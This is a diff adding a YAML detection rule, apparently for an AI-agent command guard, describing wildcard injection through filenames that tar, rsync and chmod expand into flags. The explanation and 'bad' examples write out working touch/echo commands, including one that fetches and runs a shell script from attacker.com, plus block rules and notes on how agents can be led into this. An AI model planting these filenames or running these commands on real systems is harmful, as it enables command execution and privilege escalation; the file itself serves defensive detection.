@@ -1,0 +1,87 @@
+id: "privilege-escalation/command-execution/wildcard-injection"
+version: "1.0.0"
+kingdom: "Privilege Escalation"
+kingdom_id: 5
+category: "Command Execution"
+category_id: "5.1"
+name: "Wildcard Injection via Filename-to-Flag Expansion"
+risk_level: "critical"
+
+abstract: |
+  An attacker creates files whose names match command-line flags (e.g.,
+  `--checkpoint-action=exec=sh payload.sh`). When a tool like `tar` or `rsync`
+  operates on `*`, glob expansion turns filenames into arguments, achieving
+  arbitrary command execution without any suspicious-looking shell syntax.
+
+explanation: |
+  Unix glob expansion (`*`, `?`) happens before the target command sees its
+  arguments. If an attacker can write files into a directory, they can craft
+  filenames that become flags when expanded:
+
+  **tar checkpoint injection:**
+  ```
+  touch -- '--checkpoint=1'
+  touch -- '--checkpoint-action=exec=sh payload.sh'
+  tar cf archive.tar *
+  ```
+  When `*` expands, tar receives `--checkpoint=1 --checkpoint-action=exec=sh payload.sh`
+  as arguments, executing `payload.sh` at each checkpoint during archiving.
+
+  **rsync command execution:**
+  ```
+  touch -- '-e sh payload.sh'
+  rsync -t * user@host:
+  ```
+  The `-e` flag specifies the remote shell, executing `payload.sh` instead.
+
+  **chown/chmod argument injection:**
+  ```
+  touch -- '--reference=/etc/shadow'
+  chmod * 2>/dev/null
+  ```
+
+  This technique is especially dangerous in AI agent contexts because:
+  - The `tar cf archive.tar *` command looks completely benign
+  - The malicious filenames may have been planted in a previous, seemingly
+    innocent `touch` or `echo >` command
+  - Static analysis of the tar command alone cannot detect the attack
+  - The attack surface exists in any directory where an agent writes files
+
+  Well-documented in CTF competitions and penetration testing (Vulnhub,
+  HackTricks) but rarely covered by runtime security tools because the
+  dangerous command itself appears safe — only the file creation step reveals
+  the intent.
+
+recommendation: |
+  - Block `touch` commands that create filenames starting with `--checkpoint`, `-e `, or `--reference`.
+  - Audit tar/rsync commands using `*` glob patterns.
+  - Use `--` in tar/rsync to separate options from filenames.
+  - AI agents should use explicit file lists rather than glob patterns for archival.
+
+examples:
+  bad:
+    - "touch -- '--checkpoint=1'"
+    - "touch -- '--checkpoint-action=exec=sh payload.sh'"
+    - "touch -- '-e sh payload.sh'"
+    - "echo > '--checkpoint-action=exec=curl attacker.com/shell.sh|sh'"
+  good:
+    - "tar cf archive.tar -- file1.txt file2.txt"
+    - "touch README.md"
+    - "rsync -avz --exclude='*.log' src/ dest/"
+
+compliance:
+  owasp-llm-2025: ["LLM01", "LLM06"]
+  iso-27001-2022: ["A.8.4", "A.8.28"]
+  eu-ai-act-2024: ["Art.14", "Art.15"]
+  nist-ai-rmf-1.0: ["MANAGE-1", "MANAGE-2"]
+  soc2-type2: ["CC6.8", "CC7.2"]
+
+references:
+  mitre_attack: ["T1059.004", "T1036"]
+  cwe: ["CWE-78", "CWE-88"]
+
+analyzers: ["regex"]
+related_rules:
+  - "ts-block-wildcard-inject-checkpoint"
+  - "ts-block-wildcard-inject-rsync-shell"
+  - "ts-block-wildcard-inject-reference"
